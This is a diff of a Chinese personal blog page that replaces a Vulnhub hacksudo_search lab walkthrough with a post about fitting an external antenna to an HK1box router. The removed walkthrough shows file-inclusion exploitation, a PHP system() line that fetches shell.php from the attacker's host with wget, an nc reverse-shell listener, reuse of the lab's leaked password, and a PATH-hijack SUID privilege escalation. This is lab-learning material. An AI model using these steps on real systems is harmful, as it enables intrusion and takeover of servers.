@@ -6,42 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://xuancun.github.io">
-  <title>Vulnhub:hacksudo_search通关笔记 | lion&#39;s blog</title>
+  <title>HK1box硬改天线 | lion&#39;s blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="nmap扫描端口:">
+  <meta name="description" content="在2021的中旬入手了hk1box:">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub:hacksudo_search通关笔记">
-<meta property="og:url" content="https://xuancun.github.io/2022/01/03/hacksudo_search/index.html">
+<meta property="og:title" content="HK1box硬改天线">
+<meta property="og:url" content="https://xuancun.github.io/2022/02/24/HK1box/index.html">
 <meta property="og:site_name" content="lion&#39;s blog">
-<meta property="og:description" content="nmap扫描端口:">
+<meta property="og:description" content="在2021的中旬入手了hk1box:">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THl5SU.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THG63V.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlhWT.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THloy4.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlbwR.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlTOJ.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlHm9.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlqT1.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlOFx.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlxSO.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/THlzlD.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1S6e.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1Cmd.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1P0A.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1kkt.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1iTI.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1AtP.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1Eff.png">
-<meta property="og:image" content="https://s4.ax1x.com/2022/01/03/TH1e1S.png">
-<meta property="article:published_time" content="2022-01-03T08:33:10.000Z">
-<meta property="article:modified_time" content="2022-01-03T08:39:04.543Z">
+<meta property="og:image" content="https://s4.ax1x.com/2022/02/24/bF1Op9.png">
+<meta property="og:image" content="https://s4.ax1x.com/2022/02/24/bFQRAg.jpg">
+<meta property="article:published_time" content="2022-02-24T09:29:27.000Z">
+<meta property="article:modified_time" content="2022-02-24T09:32:06.964Z">
 <meta property="article:author" content="lion">
-<meta property="article:tag" content="Ctf">
+<meta property="article:tag" content="arm">
+<meta property="article:tag" content="openwrt">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s4.ax1x.com/2022/01/03/THl5SU.png">
+<meta name="twitter:image" content="https://s4.ax1x.com/2022/02/24/bF1Op9.png">
   
     <link rel="alternative" href="/atom.xml" title="lion&#39;s blog" type="application/atom+xml">
   
@@ -232,14 +216,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hacksudo_search" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-HK1box" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      Vulnhub:hacksudo_search通关笔记
+      HK1box硬改天线
     </h1>
   
 
@@ -251,8 +235,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2022/01/03/hacksudo_search/" class="archive-article-date">
-        <time datetime="2022-01-03T08:33:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-03</time>
+<a href="/2022/02/24/HK1box/" class="archive-article-date">
+        <time datetime="2022-02-24T09:29:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-24</time>
 </a>
 
   
@@ -265,7 +249,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">411字</span>
+      <span class="post-count">363字</span>
     </span>
   </span>
 
@@ -285,93 +269,19 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口:"></a>nmap扫描端口:</h3><span id="more"></span>
+    <h3 id="在2021的中旬入手了hk1box"><a href="#在2021的中旬入手了hk1box" class="headerlink" title="在2021的中旬入手了hk1box:"></a>在2021的中旬入手了hk1box:</h3><span id="more"></span>
 
-<p><img src="https://s4.ax1x.com/2022/01/03/THl5SU.png" alt="https://s4.ax1x.com/2022/01/03/THl5SU.png"></p>
+<p><img src="https://s4.ax1x.com/2022/02/24/bF1Op9.png" alt="https://s4.ax1x.com/2022/02/24/bF1Op9.png"></p>
+<p>当时入手的价格是200出头，虽然价格有点高，但是换了好的电源再加上一个好用的遥控器，总体上还不错，并且加上这是新的arm软路由，虽然只有一个千兆网口，但是对比上隔壁的双网口的R1S的arm软路由价格，又能看电视又可以当作软路由的hk1box实在是太香了，虽然只有一个网口，但是好在有usb3.0接USB千兆网卡，也可以和R1S一样的。</p>
+<p>但是由于盒子本身做工很差，散热也不太如意。随随便便就可以达到50度左右。所以在某宝上买了适配的盒子外壳和散热片，虽然也附加了风扇，但是我嫌风扇有点吵，所以没有安装，温度虽然没有下降，但是没有积热的问题，没有那么烫手了。</p>
+<p>不巧的是我在安装外壳的时候，不小心把天线给弄断了，索性就把贴片式的天线换成了外置天线。在盒子的pcb上没有焊接天线底座，所以只能买焊接式的天线底座。</p>
+<p><img src="https://s4.ax1x.com/2022/02/24/bFQRAg.jpg" alt="https://s4.ax1x.com/2022/02/24/bFQRAg.jpg"></p>
 <aside>
-💡 开放ssh端口和http端口
+💡 天线焊接分为天线点和屏蔽点，要注意这个两个点不能短路。
 
 </aside>
 
-<h3 id="浏览器打开80端口"><a href="#浏览器打开80端口" class="headerlink" title="浏览器打开80端口:"></a>浏览器打开80端口:</h3><p><img src="https://s4.ax1x.com/2022/01/03/THG63V.png" alt="https://s4.ax1x.com/2022/01/03/THG63V.png"></p>
-<p>页面只有一个搜索框，输入之后会跳转到搜索页面。</p>
-<h3 id="gobuster进行web页面路径爆破"><a href="#gobuster进行web页面路径爆破" class="headerlink" title="gobuster进行web页面路径爆破:"></a>gobuster进行web页面路径爆破:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -e -w C:\Users\Administrator\Desktop\gobuster\dir.txt -u 192.168.0.18 | grep -v <span class="string">&quot;403&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s4.ax1x.com/2022/01/03/THlhWT.png" alt="https://s4.ax1x.com/2022/01/03/THlhWT.png"></p>
-<aside>
-💡 发现search1.php页面
-
-</aside>
-
-<p><img src="https://s4.ax1x.com/2022/01/03/THloy4.png" alt="https://s4.ax1x.com/2022/01/03/THloy4.png"></p>
-<h3 id="gobuster进行参数fuzz"><a href="#gobuster进行参数fuzz" class="headerlink" title="gobuster进行参数fuzz:"></a>gobuster进行参数fuzz:</h3><p><img src="https://s4.ax1x.com/2022/01/03/THlbwR.png" alt="https://s4.ax1x.com/2022/01/03/THlbwR.png"></p>
-<aside>
-💡 me参数存在文件包含漏洞
-
-</aside>
-
-<p>试着读取一下/etc/passwd文件:</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/THlTOJ.png" alt="https://s4.ax1x.com/2022/01/03/THlTOJ.png"></p>
-<h3 id="包含shell-php"><a href="#包含shell-php" class="headerlink" title="包含shell.php:"></a>包含shell.php:</h3><p>使用包含着下载shell.php命令的exec.php执行下载命令,然后反弹。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;wget http://192.168.0.16:8000/shell.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s4.ax1x.com/2022/01/03/THlHm9.png" alt="https://s4.ax1x.com/2022/01/03/THlHm9.png"></p>
-<p>由于无法上传文件，使用python搭建http服务下载shell.php就能反弹了。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python快速开启http服务:</span></span><br><span class="line">pyhton -m http.server 8000</span><br><span class="line"><span class="comment">#nc监听端口:</span></span><br><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
-
-<p>先用me参数访问exec.php，等下载好shell.php之再访问，然后就可以用nc连接。</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/THlqT1.png" alt="https://s4.ax1x.com/2022/01/03/THlqT1.png"></p>
-<p><img src="https://s4.ax1x.com/2022/01/03/THlOFx.png" alt="https://s4.ax1x.com/2022/01/03/THlOFx.png"></p>
-<aside>
-💡 shell.php下载完成，并且已经可以访问。
-
-</aside>
-
-<p><img src="https://s4.ax1x.com/2022/01/03/THlxSO.png" alt="https://s4.ax1x.com/2022/01/03/THlxSO.png"></p>
-<p>nc连接成功。</p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权:"></a>提权:</h3><p>在/var/www/html下存在.env目录，其中的数据库密码MyD4dSuperH3r0!可以用于hacksudo用户登录。</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/THlzlD.png" alt="https://s4.ax1x.com/2022/01/03/THlzlD.png"></p>
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1S6e.png" alt="https://s4.ax1x.com/2022/01/03/TH1S6e.png"></p>
-<aside>
-💡 hackdo登录成功。
-
-</aside>
-
-<p>查找SUID文件进行提权:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1Cmd.png" alt="https://s4.ax1x.com/2022/01/03/TH1Cmd.png"></p>
-<p>home目录下的searchinstall文件具有SUID权限。</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1P0A.png" alt="https://s4.ax1x.com/2022/01/03/TH1P0A.png"></p>
-<aside>
-💡 setuid(0)可以用于提权，只要替换一下install命令就可以直接获取root权限
-
-</aside>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用bash命令替换install命令并替换环境变量，这样就可以用root权限执行bash命令.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; /tmp/install</span><br><span class="line">chmod 777 install</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1kkt.png" alt="https://s4.ax1x.com/2022/01/03/TH1kkt.png"></p>
-<aside>
-💡 提权成功
-
-</aside>
-
-<p>root.txt:</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1iTI.png" alt="https://s4.ax1x.com/2022/01/03/TH1iTI.png"></p>
-<p>note.txt:</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1AtP.png" alt="https://s4.ax1x.com/2022/01/03/TH1AtP.png"></p>
-<p>mysql登录一下:</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1Eff.png" alt="https://s4.ax1x.com/2022/01/03/TH1Eff.png"></p>
-<p>search1.php</p>
-<p><img src="https://s4.ax1x.com/2022/01/03/TH1e1S.png" alt="https://s4.ax1x.com/2022/01/03/TH1e1S.png"></p>
-<p>Vulnhub:hackdo_search下载链接:</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-search,683/">https://www.vulnhub.com/entry/hacksudo-search,683/</a></p>
-</blockquote>
-<p>gobuster链接:</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p>
-</blockquote>
+<p>焊接完之后的天线，信号好了不少，即使隔了一堵墙信号也可以达到70兆每秒。</p>
 
     
 
@@ -386,7 +296,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://xuancun.github.io/2022/01/03/hacksudo_search/" title="Vulnhub:hacksudo_search通关笔记" target="_blank">https://xuancun.github.io/2022/01/03/hacksudo_search/</a>
+          <a href="https://xuancun.github.io/2022/02/24/HK1box/" title="HK1box硬改天线" target="_blank">https://xuancun.github.io/2022/02/24/HK1box/</a>
         </li>
         
         <li>
@@ -408,7 +318,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">arm</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">openwrt</a>
         		</li>
       		
 		</ul>
@@ -464,7 +378,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://xuancun.github.io/2022/01/03/hacksudo_search/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://xuancun.github.io/2022/02/24/HK1box/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -479,18 +393,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2022/01/03/driftingblues7/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Vulnhub-driftingblues:7通关笔记
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/12/29/log4j/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">log4j2漏洞复现(CVE-2021-44228)</div>
+    <a href="/2022/02/22/Vulnhubvulncms/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Vulnhub-vulncms通关笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
